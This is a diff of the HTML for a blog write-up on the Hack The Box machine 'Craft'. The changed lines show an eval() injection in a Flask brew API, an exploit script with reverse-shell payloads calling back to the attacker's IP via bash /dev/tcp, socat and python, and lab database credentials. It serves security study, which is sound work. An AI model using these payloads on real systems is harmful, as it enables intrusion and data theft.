@@ -13,6 +13,8 @@ Today I&amp;rsquo;m going to exploit some poor programming decisions and leverag
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
+<meta name="twitter:image" content="" />
+<meta name="itemprop:image" content="" />
 <link rel="canonical" href="/posts/hack-the-box-craft/" />
 
 
@@ -57,14 +59,11 @@ Today I&amp;rsquo;m going to exploit some poor programming decisions and leverag
 <meta itemprop="description" content="Delve deep into the perils of programming on craft beer.">
 <meta itemprop="datePublished" content="2020-01-04T14:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-01-04T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="2515">
-<meta itemprop="image" content="/"/>
+<meta itemprop="wordCount" content="2516">
 
 
 
-<meta itemprop="keywords" content="ctf,HackTheBox,pentesting,Git,Python,Custom Exploitation," /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="/"/>
-
+<meta itemprop="keywords" content="ctf,HackTheBox,pentesting,Git,Python,Custom Exploitation," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Hack The Box - Craft"/>
 <meta name="twitter:description" content="Delve deep into the perils of programming on craft beer."/>
 
@@ -283,13 +282,13 @@ Today I&amp;rsquo;m going to exploit some poor programming decisions and leverag
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
 <span style="color:#a6e22e">@api.expect</span>(beer_entry)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
-    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"></span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">    Creates a new brew entry.</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">    </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    Creates a new brew entry.
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
 
     <span style="color:#75715e"># make sure the ABV value is sane.</span>
-    <span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>]):
-        <span style="color:#66d9ef">return</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ABV must be a decimal value less than 1.0</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">400</span>
+    <span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;abv&#39;</span>]):
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ABV must be a decimal value less than 1.0&#34;</span>, <span style="color:#ae81ff">400</span>
     <span style="color:#66d9ef">else</span>:
         create_brew(request<span style="color:#f92672">.</span>json)
         <span style="color:#66d9ef">return</span> None, <span style="color:#ae81ff">201</span>
@@ -307,28 +306,28 @@ Today I&amp;rsquo;m going to exploit some poor programming decisions and leverag
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> json
 
-response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/login</span><span style="color:#e6db74">&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dinesh</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4aUh0A8PbVJxgd</span><span style="color:#e6db74">&#39;</span>), verify<span style="color:#f92672">=</span>False)
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/login&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span>), verify<span style="color:#f92672">=</span>False)
 json_response <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>text)
-token <span style="color:#f92672">=</span>  json_response[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">token</span><span style="color:#e6db74">&#39;</span>]
+token <span style="color:#f92672">=</span>  json_response[<span style="color:#e6db74">&#39;token&#39;</span>]
 
-headers <span style="color:#f92672">=</span> { <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">X-Craft-API-Token</span><span style="color:#e6db74">&#39;</span>: token, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Content-Type</span><span style="color:#e6db74">&#39;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">application/json</span><span style="color:#e6db74">&#39;</span>  }
+headers <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token, <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>  }
 
 <span style="color:#75715e"># make sure token is valid</span>
-response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/check</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/check&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
 
 <span style="color:#75715e"># create a sample brew with bogus ABV... should fail.</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Create bogus ABV brew</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Create bogus ABV brew&#34;</span>)
 brew_dict <span style="color:#f92672">=</span> {}
-brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).system(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#39;</span>
-brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">hacking ya</span><span style="color:#e6db74">&#39;</span>
-brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">brewer</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
-brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">style</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
+brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).system(&#34;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&#34;)&#39;</span>
+brew_dict[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hacking ya&#39;</span>
+brew_dict[<span style="color:#e6db74">&#39;brewer&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
+brew_dict[<span style="color:#e6db74">&#39;style&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
 
 json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(brew_dict)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">attempting hack...</span><span style="color:#e6db74">&#39;</span>)
-response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/brew/</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;attempting hack...&#39;</span>)
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;https://api.craft.htb/api/brew/&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
 </code></pre></div><p>The important part is <code>brew_dict['abv'] = '__**import__**(&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&quot;)'</code></p>
 <p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won&rsquo;t know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
@@ -378,7 +377,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <li>The command to connect via socat also needs to be modified since it&rsquo;s using quotes, and the newly downloaded socat isn&rsquo;t in PATH.</li>
 </ol>
 <p>To solve those issues I added a chmod +x command, escaped the quotes, and added a ./ in front of the socat so linux knows to look in the current folder for it. The end result is this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).system(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chmod +x socat; ./socat exec:</span><span style="color:#e6db74">&#39;</span>sh <span style="color:#f92672">-</span>li<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#39;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).system(&#34;chmod +x socat; ./socat exec:&#39;</span>sh <span style="color:#f92672">-</span>li<span style="color:#e6db74">&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226&#34;)&#39;</span>
 </code></pre></div><p>Well crap&hellip; none of that is working. I played around and still no luck&hellip; Then I realized, I have no idea what kind of shell they are using, but I know they can execute python3 based on the git repository. I decided to try my luck with a reverse shell written in python that uses sockets instead of a shell.</p>
 <p>I found one here: <a href="https://github.com/trackmastersteve/shell">https://github.com/trackmastersteve/shell</a>, changed the IP/Port info in both files, started the listener, and executed the following command on the victim:<code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;python3 ./shell.py&quot;)'</code></p>
 
@@ -412,21 +411,21 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <h1 id="pivoting-for-more-access">Pivoting for More Access</h1>
 <p>Now I might have a full TTY shell, but I still have very limited access. I did some poking around and found a settings.py file with a bunch of secrets for the API:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Flask settings</span>
-FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">api.craft.htb</span><span style="color:#e6db74">&#39;</span>
+FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
 FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>
 
 <span style="color:#75715e"># Flask-Restplus settings</span>
-RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">list</span><span style="color:#e6db74">&#39;</span>
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
 RESTPLUS_VALIDATE <span style="color:#f92672">=</span> True
 RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> False
 RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> False
-CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">hz66OCkDtv8G6D</span><span style="color:#e6db74">&#39;</span>
+CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>
 
 <span style="color:#75715e"># database</span>
-MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">craft</span><span style="color:#e6db74">&#39;</span>
-MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">qLGockJ6G2J75O</span><span style="color:#e6db74">&#39;</span>
-MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">craft</span><span style="color:#e6db74">&#39;</span>
-MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">db</span><span style="color:#e6db74">&#39;</span>
+MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
+MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
 SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
 </code></pre></div><p>Just look at all those juicy secrets! An inspection of the environment variables reveals something interesting as well:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GPG_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D&#39;</span>
@@ -448,7 +447,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 <span style="color:#66d9ef">try</span>:
     <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
-        sql <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">show databases</span><span style="color:#e6db74">&#34;</span>
+        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;show databases&#34;</span>
         cursor<span style="color:#f92672">.</span>execute(sql)
         results <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
         <span style="color:#66d9ef">print</span>(results)
@@ -608,7 +607,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/ctf">ctf</a></span><span class="tag"><a href="/tags/hackthebox">HackTheBox</a></span><span class="tag"><a href="/tags/pentesting">pentesting</a></span><span class="tag"><a href="/tags/git">Git</a></span><span class="tag"><a href="/tags/python">Python</a></span><span class="tag"><a href="/tags/custom-exploitation">Custom Exploitation</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2515 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2516 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-01-04 00:00 &#43;0000</p>
         </div>
